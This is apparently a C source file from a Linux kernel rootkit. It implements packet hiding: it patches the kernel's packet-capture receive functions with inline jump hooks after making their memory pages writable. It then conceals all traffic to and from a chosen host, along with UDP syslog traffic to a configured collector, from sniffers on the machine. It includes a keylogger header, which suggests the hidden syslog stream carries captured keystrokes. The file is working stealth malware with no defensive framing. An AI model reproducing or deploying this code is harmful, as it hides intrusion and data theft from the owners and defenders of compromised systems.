#include <linux/kernel.h>
#include <net/ip.h>

#include "kernel_functions.h"
#include "syscall.h"
#include "keylogger.h"
#include "packet_hiding.h"

#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDR_OFFSET 1


char* blocked_host = "10.0.0.1";
module_param(blocked_host, charp, 0);
MODULE_PARM_DESC(blocked_host, "IP of the host all packets to and from are hidden");
unsigned int blocked_host_ip;

void set_blocked_host_ip(char* ip_str)
{
  int err;
  u8 ip[4];
  const char* end;


  err = in4_pton(ip_str, -1, ip, -1, &end);
  if (err == 0) {
    return; 
  }
  blocked_host_ip = *((unsigned int*) ip);
}


char jump_code[JUMP_CODE_SIZE] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
unsigned int* jump_addr = (unsigned int*) (jump_code + JUMP_CODE_ADDR_OFFSET);


spinlock_t hook_lock;

int hide_packet(struct sk_buff* skb)
{
  
  if (skb->protocol == htons(ETH_P_IP)) {
  
    struct iphdr* iph = (struct iphdr*) skb_network_header(skb);

    
    if (iph->saddr == blocked_host_ip || iph->daddr == blocked_host_ip){
      return 1;
    }


    if (iph->protocol == IPPROTO_UDP && iph->daddr == syslog_ip_bin) {


      struct udphdr* udph = (struct udphdr*) (iph + 1);


      if (udph->dest == htons(syslog_port_bin)) {
        return 1;
      }
    }
  }
  return 0;
}

HOOKING_FOR(tpacket_rcv);
HOOKING_FOR(packet_rcv);
HOOKING_FOR(packet_rcv_spkt);


void enable_packet_hiding(void)
{
  hook_tpacket_rcv();
  hook_packet_rcv();
  hook_packet_rcv_spkt();
}

void disable_packet_hiding(void)
{
  restore_tpacket_rcv();
  restore_packet_rcv();
  restore_packet_rcv_spkt();
}

void init_packet_hiding(void)
{

  PAGE_WRITABLE(tpacket_rcv);
  PAGE_WRITABLE(packet_rcv);
  PAGE_WRITABLE(packet_rcv_spkt);

  set_blocked_host_ip(blocked_host);
  enable_packet_hiding();
}

void finalize_packet_hiding(void)
{
  disable_packet_hiding();


  RESTORE_PAGE(tpacket_rcv);
  RESTORE_PAGE(packet_rcv);
  RESTORE_PAGE(packet_rcv_spkt);
}

